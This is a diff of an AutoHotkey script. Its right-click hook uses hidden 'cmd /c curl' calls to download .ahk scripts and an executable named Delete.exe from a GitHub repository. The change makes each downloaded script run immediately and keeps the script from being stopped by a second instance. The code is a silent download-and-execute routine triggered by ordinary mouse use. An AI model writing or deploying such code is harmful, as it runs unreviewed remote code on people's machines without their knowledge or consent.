@@ -1,4 +1,4 @@
-#SingleInstance Force
+#SingleInstance Ignore
 
 ^Esc::ExitApp
 
@@ -26,11 +26,9 @@ $RButton::{
         for letter in letters {
             command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".ahk > " path "\" letter ".ahk"
             RunWait command, , "Hide"
+            Run path "\" letter ".ahk"
         }
         command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/Delete.exe > " path "\Delete.exe"
         RunWait command, , "Hide"
-        for file in DirList(path "\*") {
-            Run file
-        }
     }
 }
